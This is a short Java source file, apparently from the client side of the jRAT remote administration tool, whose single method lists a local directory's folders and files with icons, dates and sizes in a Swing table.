package se.jrat.client.io;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import javax.swing.Icon;
import javax.swing.table.DefaultTableModel;

import se.jrat.client.utils.IconUtils;

public class FileSystem {

	public static void addDir(String dir, DefaultTableModel model, Map<String, Icon> icons) {
		File f = new File(dir);
		if (f.exists()) {
			File[] childs = f.listFiles();
			List<File> files = new ArrayList<File>();
			List<File> dirs = new ArrayList<File>();

			if (childs != null) {
				for (File file : childs) {
					if (file.isDirectory()) {
						dirs.add(file);
					} else {
						files.add(file);
					}
				}
			}

			for (File file : dirs) {
				FileObject fo = new FileObject(file.getAbsolutePath());
				fo.setHidden(file.isHidden());
				fo.setIcon(IconUtils.getFileIcon(file));
				
				model.addRow(new Object[] { fo });
			}

			for (File file : files) {
				FileObject fo = new FileObject(file.getAbsolutePath());
				fo.setHidden(file.isHidden());
				fo.setIcon(IconUtils.getFileIcon(file));
				fo.setDate(file.lastModified());
				fo.setSize(file.length());
				
				model.addRow(new Object[] { fo });
			}
		}
	}

}
